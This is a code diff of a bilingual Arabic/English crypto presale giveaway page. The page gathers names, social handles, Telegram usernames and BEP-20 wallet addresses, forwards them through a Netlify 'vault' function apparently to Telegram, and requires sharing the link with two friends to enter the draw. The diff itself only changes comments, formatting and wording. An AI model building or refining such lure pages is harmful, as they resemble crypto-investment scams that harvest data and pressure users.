@@ -77,20 +77,17 @@
 <script>
     let currentLang = 'ar';
 
+    // دالة الإرسال الآمنة لـ Netlify
     async function sendTelegram(text) {
-        // التعديل السحري للأمان: الإرسال عبر الخزنة في نتليفاي
         try {
             await fetch('/.netlify/functions/vault', {
                 method: 'POST',
                 body: JSON.stringify({ text: text })
             });
-        } catch (e) { console.error("Error sending..."); }
+        } catch (e) { console.log("Error"); }
     }
 
-    function next(h, s) { 
-        document.getElementById('step'+h).classList.add('hidden'); 
-        document.getElementById('step'+s).classList.remove('hidden'); 
-    }
+    function next(h, s) { document.getElementById('step'+h).classList.add('hidden'); document.getElementById('step'+s).classList.remove('hidden'); }
 
     function sendStep1() {
         let n = document.getElementById('name').value;
@@ -117,6 +114,7 @@
         next(4, '-finish');
     }
 
+    // بيانات اللغة الأصلية كما هي
     const langData = {
         en: {
             st1: "Journey Started: <b>4 steps</b> remaining", p1: "Register to join the early investors list", namePl: "Full Name", contactPl: "Telegram / Twitter", btn1: "Continue",
@@ -127,7 +125,7 @@
         },
         ar: {
             st1: "بدأت الرحلة: بقي <b>4 خطوات</b> للنهاية", p1: "سجل بياناتك للانضمام إلى قائمة المستثمرين الأوائل", namePl: "الاسم الكامل", contactPl: "تيلجرام / تويتر", btn1: "استمرار",
-            st2: "انتهت مرحلة: بقي <b>3 خطوات</b> للنهاية", h3: "البيع المسبق", p3: "البيع المسبق: فرصة ذهبية للحصول على العملات بأقل سعر قبل المنصات.", btnYes: "أنا مهتم", btnSkip: "تخطي الآن",
+            st2: "انتهت مرحلة: بقي <b>3 خطوات</b> للنهاية", h3: "البيع المسبق", p3: "فرصة ذهبية للحصول على العملات بأقل سعر قبل المنصات.", btnYes: "أنا مهتم", btnSkip: "تخطي الآن",
             st3: "انتهت مرحلتان: بقي <b>خطوتان</b> للنهاية", hShare: "📢 خطوة المشاركة", alert: "🚨 **تنبيه هام:** لضمان دخول السحب، يجب مشاركة الرابط مع صديقين.", already: "لقد شاركت الرابط سابقاً", shareBtn: "📲 مشاركة الرابط مع صديقين",
             st4: "انتهت 3 مراحل: بقي <b>خطوة واحدة</b> أخيرة", hFinal: "المرحلة النهائية 🏆", pFinal: "اكتب عنوان محفظتك واليوزر لاستلام الجائزة في حال فوزك", walletPl: "عنوان محفظتك (BEP-20)", userPl: "يوزر التيلجرام الخاص بك (@username)", finishBtn: "إرسال البيانات ودخول السحب",
             success: "✅ تم بنجاح!", thanks: "شكراً لك! تم تسجيل محفظتك وبياناتك بنجاح. حظاً موفقاً!", langBtn: "English"
@@ -139,6 +137,7 @@
         const d = langData[currentLang];
         document.getElementById('langBtn').innerText = d.langBtn;
         document.dir = currentLang === 'ar' ? 'rtl' : 'ltr';
+        // تحديث جميع النصوص
         document.getElementById('st1').innerHTML = d.st1; document.getElementById('t-p1').innerText = d.p1; document.getElementById('name').placeholder = d.namePl; document.getElementById('contact_init').placeholder = d.contactPl; document.getElementById('t-btn1').innerText = d.btn1;
         document.getElementById('st2').innerHTML = d.st2; document.getElementById('t-h3').innerText = d.h3; document.getElementById('t-p3').innerText = d.p3; document.getElementById('t-btn-yes').innerText = d.btnYes; document.getElementById('t-btn-skip').innerText = d.btnSkip;
         document.getElementById('st3').innerHTML = d.st3; document.getElementById('t-h-share').innerText = d.hShare; document.getElementById('t-alert').innerText = d.alert; document.getElementById('t-already').innerText = d.already; document.getElementById('t-share-btn').innerText = d.shareBtn;
